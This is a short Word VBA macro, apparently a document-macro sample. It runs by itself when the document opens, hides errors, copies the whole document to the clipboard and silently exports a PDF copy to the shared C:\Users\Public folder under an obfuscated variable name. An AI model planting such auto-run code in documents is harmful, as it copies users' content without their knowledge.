Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim jybosg1pnivrj As Object
    On Error Resume Next
    Set jybosg1pnivrj = ActiveDocument.Range
    jybosg1pnivrj.Copy
    ActiveDocument.ExportAsFixedFormat OutputFileName:= _
        "C:\Users\Public\oblivionx_format.pdf", ExportFormat:=wdExportFormatPDF
End Sub
